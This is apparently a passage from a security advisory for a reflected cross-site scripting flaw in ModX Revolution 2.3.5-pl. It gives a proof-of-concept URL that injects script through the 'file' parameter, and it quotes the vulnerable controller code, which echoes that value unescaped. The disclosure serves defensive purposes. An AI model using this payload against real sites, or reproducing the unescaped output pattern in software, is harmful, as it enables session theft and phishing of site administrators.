2. Vulnerability Description

ModX Revolution 2.3.5-pl is vulnerable to reflected cross site
scripting. With this, it is possible to inject and execute arbitrary
JavaScript code. This can for example be used by an attacker to inject a
JavaScript keylogger, bypass CSRF protection, or perform phishing attacks.

The attack can be exploited by getting the victim to click a link or
visit an attacker controlled website.

3. Proof of Concept

The injection takes place into the file GET argument, which is echoed
inside script tags.

http://localhost/modx-2.3.5-pl/manager/?a=system/file/edit&file=xsstest",record:
{"name":"","basename":"","path":"","size":false,"last_accessed":"Jan 01,
1970 01:00:00 AM","last_modified":"Jan 01, 1970 01:00:00
AM","content":false,"image":false,"is_writable":false,"is_readable":false,"source":1},canSave:
0});});alert(1); </script>&wctx=mgr&source=1

4. Code


    manager/controllers/default/system/file/edit.class.php:28
        public function loadCustomCssJs() {

$this->addJavascript($this->modx->getOption('manager_url').'assets/modext/sections/system/file/edit.js');
            $this->addHtml('<script
type="text/javascript">Ext.onReady(function() {
                MODx.load({
                    xtype: "modx-page-file-edit"
                    ,file: "'.$this->filename.'"
                    ,record: '.$this->modx->toJSON($this->fileRecord).'
                    ,canSave: '.($this->canSave ? 1 : 0).'
                });
            });</script>');
